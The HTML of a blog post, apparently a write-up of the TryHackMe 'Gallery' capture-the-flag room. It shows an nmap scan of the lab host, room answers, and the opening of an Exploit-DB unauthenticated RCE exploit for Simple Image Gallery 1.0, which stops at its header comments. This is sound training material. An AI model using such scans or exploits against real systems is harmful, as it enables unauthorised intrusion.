<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head>
    <script defer language="javascript" type="text/javascript" src="https://whokilleddb.github.io/blogs/js/light_dark.js"></script>
<script defer language="javascript" type="text/javascript" src="https://whokilleddb.github.io/blogs/js/tabs.js"></script>


<script defer language="javascript" type="text/javascript" src="https://whokilleddb.github.io/blogs/js/katex.min.js"></script>


<script defer language="javascript" type="text/javascript" src="https://whokilleddb.github.io/blogs/js/auto-render.min.js"></script>


<script defer language="javascript" type="text/javascript" src="https://whokilleddb.github.io/blogs/js/katex.js"></script>
<script defer language="javascript" type="text/javascript" src="https://whokilleddb.github.io/blogs/js/toc.js"></script>


    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="generator" content="Hugo 0.109.0">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>TryHackMe: Gallery &middot; </title>
    <meta name="description" content="" />

    
    <link type="text/css" rel="stylesheet" href="https://whokilleddb.github.io/blogs/css/poole.css">
<link type="text/css" rel="stylesheet" href="https://whokilleddb.github.io/blogs/css/syntax.css">
<link type="text/css" rel="stylesheet" href="https://whokilleddb.github.io/blogs/css/hyde.css">
<link type="text/css" rel="stylesheet" href="https://whokilleddb.github.io/blogs/css/poison.css">
<link type="text/css" rel="stylesheet" href="https://whokilleddb.github.io/blogs/css/fonts.css">
<link type="text/css" rel="stylesheet" href="https://whokilleddb.github.io/blogs/css/katex.min.css">
<link type="text/css" rel="stylesheet" href="https://whokilleddb.github.io/blogs/css/tabs.css">


    
    
    <style>
    body {
        --sidebar-bg-color: #202020;
        --sidebar-img-border-color: #515151;
        --sidebar-p-color: #909090;
        --sidebar-h1-color: #FFF;
        --sidebar-a-color: #FFF;
        --sidebar-socials-color: #FFF;
        --text-color: #222;
        --bkg-color: #FAF9F6;
        --post-title-color: #303030;
        --list-color: #5a5a5a;
        --link-color: #268bd2;
        --date-color: #515151;
        --code-color: #bf616a;
        --code-background-color: #f9f9f9;
        --moon-sun-color: #FFF;
        --moon-sun-background-color: #515151;
    }
    body.dark-theme {
        --text-color: #eee;
        --bkg-color: #121212;
        --post-title-color: #DBE2E9;
        --list-color: #9d9d9d;
        --link-color: #268bd2;
        --date-color: #9a9a9a;
        --code-color: #ff7f7f;
        --code-background-color: #393D47;
    }
    body {
        background-color: var(--bkg-color);
    }
</style>

</head>

    <body class="dark-theme">
        <aside class="sidebar">
    <div class="container sidebar-sticky">
        <div class="light-dark" align="right">
    <button class="btn-light-dark">
        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
        </svg>
        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
        </svg>
    </button>
</div>

        <div class="sidebar-about">
    <h1 class="brand">
        
            <a href="https://whokilleddb.github.io/blogs/">
                <img src="/blogs/images/avatar.png" alt="brand image">
            </a>
        
        
            <a href="https://whokilleddb.github.io/blogs/">
                <h1>db&#39;s bl0gs</h1>
            </a>
        
    </h1>
    <p class="lead">
    I am Batman
    </p>
</div>

        <nav>
    <ul class="sidebar-nav">
        
        
        
        
            
                
                    <li class="heading">
                        <a href="/posts/">Posts</a>
                    </li>
                    
                        <li class="sub-heading">
                            Recent
                        </li>
                        
                            <li class="bullet">
                                <a href="https://whokilleddb.github.io/blogs/posts/dotnet-clr-etw/">A gentle guide to the land of .NET, CLR and ETW</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://whokilleddb.github.io/blogs/posts/thm_gallery/">TryHackMe: Gallery</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://whokilleddb.github.io/blogs/posts/thm_dig_dug/">TryHackMe: Dig Dug</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://whokilleddb.github.io/blogs/posts/thm_agentt/">TryHackMe: Agentt</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://whokilleddb.github.io/blogs/posts/a_study_in_obfuscation/">A Study In Obfuscation</a>
                            </li>
                        
                    
                
            
        

    </ul>
</nav>

        
    <a target="_blank" class="social" href="https://github.com/whokilleddb">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
        </svg>
    </a>


    <a target="_blank" class="social" href="https://linkedin.com/whokilleddb">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
        </svg>
    </a>


    <a target="_blank" class="social" href="https://twitter.com/whokilleddb">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
        </svg>
    </a>



    <a target="_blank" class="social" href="https://tryhackme.com/">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24" >
            <path fill="white" d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0-4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a.625.625 0 1 0 0-1.25H4.761a3.273 3.273 0 0 1-3.27-3.27A3.273 3.273 0 0 1 6.59 7.08a.625.625 0 0 0 .7-1.035 4.488 4.488 0 0 0-1.68-.69 5.223 5.223 0 0 1 5.096-4.104 5.221 5.221 0 0 1 5.174 4.57 4.489 4.489 0 0 0-.488.305.625.625 0 1 0 .731 1.013 3.245 3.245 0 0 1 1.912-.616 3.278 3.278 0 0 1 3.203 2.61.625.625 0 0 0 1.225-.251 4.533 4.533 0 0 0-4.428-3.61 4.54 4.54 0 0 0-.958.105C16.556 2.328 13.9 0 10.705 0zm5.192 10.64a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.054.514c0 .181.018.353.054.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .309-.296c.08-.124.137-.267.173-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.309-.291.917.917 0 0 0-.46-.108zm6.486 0a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.053.514c0 .181.017.353.053.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .31-.296c.078-.124.136-.267.172-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.308-.291.916.916 0 0 0-.461-.108zm-8.537.068l-.84.618.313.43.476-.368v1.877h.603v-2.557zm6.486 0l-.841.618.314.43.477-.368v1.877h.603v-2.557zm-4.435.445c.08 0 .143.028.193.084.05.057.087.127.114.21.026.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.028.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.248.248 0 0 1-.195-.086.584.584 0 0 1-.118-.209 1.245 1.245 0 0 1-.056-.27 2.645 2.645 0 0 1 0-.533c.01-.096.029-.186.056-.27a.583.583 0 0 1 .118-.209.25.25 0 0 1 .195-.084zm6.486 0c.08 0 .144.028.193.084.05.057.087.127.114.21.027.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.027.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.249.249 0 0 1-.195-.086.581.581 0 0 1-.117-.209 1.245 1.245 0 0 1-.056-.27 2.642 2.642 0 0 1 0-.533c.01-.096.028-.186.056-.27a.58.58 0 0 1 .117-.209.25.25 0 0 1 .195-.084zm-2.191 3.51a.93.93 0 0 0-.463.109.908.908 0 0 0-.312.291c-.08.122-.139.263-.175.426a2.383 2.383 0 0 0-.054.514c0 .18.018.353.054.516.036.164.094.308.175.432a.91.91 0 0 0 .312.296.92.92 0 0 0 .463.11c.18 0 .333-.037.46-.11a.892.892 0 0 0 .308-.296 1.32 1.32 0 0 0 .174-.432c.036-.163.054-.335.054-.516 0-.18-.018-.352-.054-.514a1.274 1.274 0 0 0-.174-.426.89.89 0 0 0-.309-.291.918.918 0 0 0-.46-.108zm-6.402.07l-.841.617.314.43.476-.369v1.878h.604v-2.557zm2.125 0l-.841.617.314.43.477-.369v1.878h.603v-2.557zm2.116 0l-.84.617.313.43.477-.369v1.878h.603v-2.557zm2.16.443c.08 0 .144.028.194.085a.605.605 0 0 1 .114.21c.026.083.044.172.053.269a2.639 2.639 0 0 1 0 .532 1.28 1.28 0 0 1-.053.27.585.585 0 0 1-.114.21.244.244 0 0 1-.193.085.25.25 0 0 1-.196-.085.589.589 0 0 1-.117-.21 1.245 1.245 0 0 1-.056-.27 2.597 2.597 0 0 1 0-.532c.01-.097.028-.186.056-.27a.589.589 0 0 1 .117-.209.249.249 0 0 1 .196-.085zm-6.729 3.073a.676.676 0 0 0-.335.078.661.661 0 0 0-.227.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.93.93 0 0 0 .127.313.65.65 0 0 0 .227.215c.092.053.204.08.335.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .225-.215c.057-.09.1-.194.125-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.931.931 0 0 0-.125-.31.658.658 0 0 0-.225-.21.667.667 0 0 0-.334-.08zm3.086 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.907.907 0 0 0-.127.31 1.69 1.69 0 0 0-.04.373c0 .131.013.256.04.375a.928.928 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.752 1.752 0 0 0 0-.748.94.94 0 0 0-.126-.31.657.657 0 0 0-.224-.21.667.667 0 0 0-.334-.08zm5.108 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.931.931 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08.13 0 .243-.027.334-.08a.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.943.943 0 0 0-.126-.31.657.657 0 0 0-.224-.21.668.668 0 0 0-.334-.08zm-6.658.05l-.61.448.227.311.346-.266v1.362h.438v-1.856zm3.068 0l-.61.448.227.311.346-.266v1.362h.438v-1.856zm5.108 0l-.611.448.228.311.346-.266v1.362h.438v-1.856zm-9.712.322c.058 0 .105.02.14.062a.421.421 0 0 1 .083.151.96.96 0 0 1 .04.196 1.932 1.932 0 0 1 0 .386.954.954 0 0 1-.04.197.421.421 0 0 1-.083.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.427.427 0 0 1-.085-.153.887.887 0 0 1-.041-.197 1.96 1.96 0 0 1 0-.386.893.893 0 0 1 .04-.196.42.42 0 0 1 .086-.151.181.181 0 0 1 .141-.062zm3.086 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.94.94 0 0 1 .04.196 1.906 1.906 0 0 1 0 .386.93.93 0 0 1-.04.197.421.421 0 0 1-.082.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.42.42 0 0 1-.086-.153.846.846 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.849.849 0 0 1 .041-.196.42.42 0 0 1 .086-.151.182.182 0 0 1 .141-.062zm5.108 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.92.92 0 0 1 .04.196 1.963 1.963 0 0 1 0 .386.943.943 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.061.18.18 0 0 1-.142-.06.437.437 0 0 1-.085-.153.95.95 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.959.959 0 0 1 .04-.196.47.47 0 0 1 .086-.151.181.181 0 0 1 .142-.062zm-1.684 1.814a.675.675 0 0 0-.336.079.66.66 0 0 0-.227.21.91.91 0 0 0-.127.31 1.731 1.731 0 0 0 0 .748.939.939 0 0 0 .127.314c.059.09.134.162.227.215.093.053.205.08.336.08a.66.66 0 0 0 .334-.08.648.648 0 0 0 .224-.215c.058-.09.1-.195.126-.314a1.737 1.737 0 0 0-.001-.747.928.928 0 0 0-.125-.31.65.65 0 0 0-.224-.211.668.668 0 0 0-.334-.079zm3.063 0a.676.676 0 0 0-.336.079.664.664 0 0 0-.227.21.906.906 0 0 0-.127.31 1.74 1.74 0 0 0 0 .748.936.936 0 0 0 .127.314.66.66 0 0 0 .227.215c.092.053.204.08.336.08a.654.654 0 0 0 .334-.08.648.648 0 0 0 .223-.215c.058-.09.1-.195.126-.314a1.74 1.74 0 0 0 0-.747.928.928 0 0 0-.126-.31.65.65 0 0 0-.223-.211.666.666 0 0 0-.334-.079zm-1.545.05l-.611.448.228.312.346-.267v1.363h.438v-1.856zm-1.518.323c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.91.91 0 0 1 .04.195 1.966 1.966 0 0 1 0 .387.951.951 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.06.18.18 0 0 1-.142-.06.428.428 0 0 1-.085-.152.914.914 0 0 1-.04-.197 1.96 1.96 0 0 1-.011-.195c0-.058.003-.122.01-.192a.923.923 0 0 1 .041-.195c.02-.06.048-.11.085-.152a.181.181 0 0 1 .142-.061zm3.063 0c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.94.94 0 0 1 .04.195 1.91 1.91 0 0 1 0 .387.93.93 0 0 1-.04.197.422.422 0 0 1-.083.152.175.175 0 0 1-.14.06.18.18 0 0 1-.141-.06.423.423 0 0 1-.085-.152.907.907 0 0 1-.04-.197 1.95 1.95 0 0 1 0-.387.915.915 0 0 1 .04-.195c.02-.06.048-.11.085-.152a.182.182 0 0 1 .142-.061zm-9.713.185a.465.465 0 0 0-.232.055.456.456 0 0 0-.157.146.627.627 0 0 0-.089.215 1.168 1.168 0 0 0-.027.259c0 .09.009.177.027.26a.648.648 0 0 0 .089.216c.04.063.093.112.157.149a.459.459 0 0 0 .232.056c.09 0 .168-.02.231-.056a.45.45 0 0 0 .156-.149.67.67 0 0 0 .087-.217 1.218 1.218 0 0 0 0-.518.647.647 0 0 0-.087-.215.448.448 0 0 0-.156-.146.458.458 0 0 0-.23-.055zm1.052.035l-.423.31.158.217.24-.185v.944h.303v-1.286zm-1.052.224c.04 0 .073.014.097.042a.284.284 0 0 1 .057.105.69.69 0 0 1 .028.136c.004.049.007.092.007.133 0 .04-.003.086-.007.135a.684.684 0 0 1-.028.136.285.285 0 0 1-.057.105.123.123 0 0 1-.097.043.125.125 0 0 1-.098-.043.298.298 0 0 1-.059-.105.612.612 0 0 1-.028-.136 1.39 1.39 0 0 1 0-.268.62.62 0 0 1 .028-.136.297.297 0 0 1 .06-.105.125.125 0 0 1 .097-.042zm3.775 1.394a.463.463 0 0 0-.232.054.452.452 0 0 0-.157.146.621.621 0 0 0-.088.214 1.19 1.19 0 0 0 0 .519.641.641 0 0 0 .088.217.46.46 0 0 0 .157.15.458.458 0 0 0 .232.054.454.454 0 0 0 .232-.055.45.45 0 0 0 .155-.149.664.664 0 0 0 .087-.217 1.189 1.189 0 0 0 0-.519.642.642 0 0 0-.087-.214.446.446 0 0 0-.155-.146.459.459 0 0 0-.232-.054zm1.052.034l-.423.31.158.216.24-.185v.945h.303V22.68zm-1.052.223c.04 0 .073.014.098.043a.3.3 0 0 1 .057.105.643.643 0 0 1 .027.135 1.31 1.31 0 0 1 0 .268.654.654 0 0 1-.027.137.307.307 0 0 1-.057.105.124.124 0 0 1-.098.042.125.125 0 0 1-.098-.042.293.293 0 0 1-.059-.105.618.618 0 0 1-.028-.137 1.364 1.364 0 0 1 0-.268.612.612 0 0 1 .028-.135.287.287 0 0 1 .06-.105.123.123 0 0 1 .097-.043z"></path>
        </svg>
    </a>




    <a target="_blank" class="social" href="https://instagram.com/whokilleddb">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
            <path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9S287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7s74.7 33.5 74.7 74.7s-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8c-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8s26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9c-26.2-26.2-58-34.4-93.9-36.2c-37-2.1-147.9-2.1-184.9 0c-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9c1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0c35.9-1.7 67.7-9.9 93.9-36.2c26.2-26.2 34.4-58 36.2-93.9c2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6c-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6c-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6c29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6c11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/>
        </svg>
    </a>



        <p class="footnote">
powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
    <br>
    &copy; 2023 . All rights reserved.
</p>

  </div>
</aside>

        <main class="content container">
            <div class="post">
  <div class="info">
    <h1 class="post-title">
        <a href="https://whokilleddb.github.io/blogs/posts/thm_gallery/">TryHackMe: Gallery</a>
    </h1>
    <time datetime="2022-09-15T01:50:35&#43;0530" class="post-date">
        September 15, 2022
    </time>
    
    
    
    
    
    
</div>

  <h1 id="introduction">Introduction</h1>
<p><strong>Challenge Name</strong>: <a href="https://tryhackme.com/room/gallery666">Gallery</a></p>
<p><strong>Difficulty</strong>: Easy</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/c53a8eb73f24535345477fdf603fe1de.png" alt="Gallery"></p>
<h1 id="nmap-enumeration">Nmap Enumeration</h1>
<p><strong>Command :</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -A -T4 --open -p- 10.10.17.83 -oN Gallery.nmap 
</span></span></code></pre></div><p><strong>Output :</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span># Nmap 7.92 scan initiated Thu Sep 15 01:55:38 2022 as: nmap -A -T4 --open -p- -oN Gallery.nmap 10.10.17.83
</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.17.83
</span></span><span style="display:flex;"><span>Host is up (0.19s latency).
</span></span><span style="display:flex;"><span>Not shown: 65516 closed tcp ports (reset), 17 filtered tcp ports (no-response)
</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.29 (Ubuntu)
</span></span><span style="display:flex;"><span>|_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span style="display:flex;"><span>8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.29 (Ubuntu)
</span></span><span style="display:flex;"><span>| http-cookie-flags: 
</span></span><span style="display:flex;"><span>|   /: 
</span></span><span style="display:flex;"><span>|     PHPSESSID: 
</span></span><span style="display:flex;"><span>|_      httponly flag not set
</span></span><span style="display:flex;"><span>|_http-open-proxy: Proxy might be redirecting requests
</span></span><span style="display:flex;"><span>|_http-title: Simple Image Gallery System
</span></span><span style="display:flex;"><span>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
</span></span><span style="display:flex;"><span>TCP/IP fingerprint:
</span></span><span style="display:flex;"><span>OS:SCAN(V=7.92%E=4%D=9/15%OT=80%CT=1%CU=40259%PV=Y%DS=5%DC=T%G=Y%TM=6322393
</span></span><span style="display:flex;"><span>OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ
</span></span><span style="display:flex;"><span>OS:(SP=108%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O
</span></span><span style="display:flex;"><span>OS:3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11NW6%O6=M506ST11)WIN(W1=F4B3%W2=
</span></span><span style="display:flex;"><span>OS:F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M506NNSN
</span></span><span style="display:flex;"><span>OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
</span></span><span style="display:flex;"><span>OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
</span></span><span style="display:flex;"><span>OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
</span></span><span style="display:flex;"><span>OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
</span></span><span style="display:flex;"><span>OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Network Distance: 5 hops
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TRACEROUTE (using port 443/tcp)
</span></span><span style="display:flex;"><span>HOP RTT       ADDRESS
</span></span><span style="display:flex;"><span>1   38.77 ms  10.17.0.1
</span></span><span style="display:flex;"><span>2   ... 4
</span></span><span style="display:flex;"><span>5   238.24 ms 10.10.17.83
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span># Nmap done at Thu Sep 15 01:57:29 2022 -- 1 IP address (1 host up) scanned in 110.99 seconds
</span></span></code></pre></div><blockquote>
<p>Q: <strong>How many ports are open?</strong></p>
<p>A: <strong>2</strong></p>
</blockquote>
<blockquote>
<p>Q: <strong>What&rsquo;s the name of the CMS?</strong></p>
<p>A: <strong>Simple Image Gallery</strong></p>
</blockquote>
<h1 id="fetching-the-exploit">Fetching the Exploit</h1>
<p><strong>Simple Image Gallery 1.0 - Remote Code Execution (RCE) (Unauthenticated)</strong> -&gt; <a href="https://www.exploit-db.com/exploits/50214">Exploit</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#75715e"># Exploit Title: Simple Image Gallery 1.0 - Remote Code Execution (RCE) (Unauthenticated)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Date: 17.08.2021</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit Author: Tagoletta (Tağmaç)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Software Link: https://www.sourcecodester.com/php/14903/simple-image-gallery-web-app-using-php-free-source-code.html</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Version: V 1.0</span>
